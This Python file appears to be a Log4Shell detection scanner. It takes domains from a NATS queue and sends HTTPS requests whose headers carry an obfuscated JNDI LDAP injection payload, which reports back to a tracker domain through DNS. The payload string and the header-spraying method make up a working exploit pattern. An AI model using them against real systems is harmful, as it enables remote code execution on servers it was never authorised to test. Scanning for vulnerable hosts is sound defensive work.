import time
import functools
import base64
import json
import argparse, sys
import logging
import asyncio
import os
import signal
import traceback
import hashlib
import random
import string
import datetime as dt
from operator import itemgetter
from concurrent.futures import TimeoutError, ProcessPoolExecutor
import requests
from nats.aio.client import Client as NATS
import urllib3
urllib3.disable_warnings()

logging.basicConfig(stream=sys.stdout, level=logging.INFO)

TIMEOUT = float(os.getenv("TIMEOUT", 1.0))
NAME = os.getenv("NAME", "log4shell-scanner")
SUBSCRIBE_TO = os.getenv("SUBSCRIBE_TO")
PUBLISH_TO = os.getenv("PUBLISH_TO")
QUEUE_GROUP = os.getenv("QUEUE_GROUP")
SERVERLIST = os.getenv("NATS_SERVERS")
SERVERS = SERVERLIST.split(",")

def to_json(msg):
    print(json.dumps(msg))

def payload(hashed_domain, header):
    encoded_header = base64.b64encode(header.encode('utf-8')).decode('utf-8').rstrip('=')
    payload = "${${::-j}${::-n}${lower:D}i:l${::-d}${::-a}${lower:P}://127.0.0.1#" + f"{hashed_domain}.{encoded_header}" + ".t.log4shell.tracker.alpha.canada.ca}"
    return payload

def log4shell(domain, domain_hash):
    try:
        headers = {
            'User-Agent': payload(domain_hash, "User-Agent"),
            'Referer': payload(domain_hash, "Referer"),
            'X-Api-Version': payload(domain_hash, "X-Api-Version"),
            'X-Csrf-Token': payload(domain_hash, 'X-Csrf-Token'),
            'X-CSRFToken': payload(domain_hash, 'X-CSRFToken'),
            'X-Forwarded-For': payload(domain_hash, 'X-Forwarded-For'),
            'Cookie': payload(domain_hash, 'Cookie'),
        }
        # only use tls because that way headers are encrypted
        response = requests.get(f"https://{domain}", headers=headers, timeout=TIMEOUT)
        response.raise_for_status()
        to_json({"domain": domain, "hash": domain_hash, "headers": headers, "status": response.status_code, "redirects": list(map(lambda res: res.url, response.history))})
    except requests.exceptions.HTTPError as e:
        to_json({'exception': True, 'status': e.response.status_code, 'reason': e.response.reason})
    except requests.ConnectionError as e:
        to_json({'exception': True,'unreachable': domain})
    except requests.exceptions.ReadTimeout as e:
        to_json({'exception': True,'timeout': domain})
    except requests.RequestException as e:
        print(e)
        pass




async def run(loop):
    nc = NATS()

    async def error_cb(e):
        print("Error:", e)

    async def closed_cb():
        print("Connection to NATS is closed.")
        await asyncio.sleep(0.1)
        loop.stop()

    async def reconnected_cb():
        print(f"Connected to NATS at {nc.connected_url.netloc}...")

    async def subscribe_handler(msg):
        subject = msg.subject
        reply = msg.reply
        data = msg.data.decode()
        payload = json.loads(msg.data)
        domain = payload["domain"]
        domain_key = payload["domain_key"]
        domain_hash = payload["hash"]
        user_key = payload["user_key"]
        shared_id = payload["shared_id"]
        selectors = payload["selectors"]

        try:
            loop = asyncio.get_event_loop()

            with ProcessPoolExecutor() as executor:
                await loop.run_in_executor(executor, functools.partial(log4shell, domain, domain_hash))

        except TimeoutError:
            logging.error(
                f"Timeout while scanning {domain} (Aborted after {round(time.time()-start, 2)} seconds)"
            )
            await nc.publish(
                f"{PUBLISH_TO}.{domain_key}.log4shell",
                json.dumps(
                    {
                        "results": {
                            "log4shell": {"error": "missing"},
                        },
                        "scan_type": "log4shell",
                        "user_key": user_key,
                        "domain_key": domain_key,
                        "shared_id": shared_id,
                    }
                ).encode(),
            )

    try:
        await nc.connect(
            loop=loop,
            error_cb=error_cb,
            closed_cb=closed_cb,
            reconnected_cb=reconnected_cb,
            servers=SERVERS,
            name=NAME,
        )
    except Exception as e:
        print(f"Exception while connecting to Nats: {e}")

    print(f"Connected to NATS at {nc.connected_url.netloc}...")

    def signal_handler():
        if nc.is_closed:
            return
        print("Disconnecting...")
        loop.create_task(nc.close())

    for sig in ("SIGINT", "SIGTERM"):
        loop.add_signal_handler(getattr(signal, sig), signal_handler)

    await nc.subscribe(SUBSCRIBE_TO, QUEUE_GROUP, subscribe_handler)


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(run(loop))
    try:
        loop.run_forever()
    finally:
        loop.close()
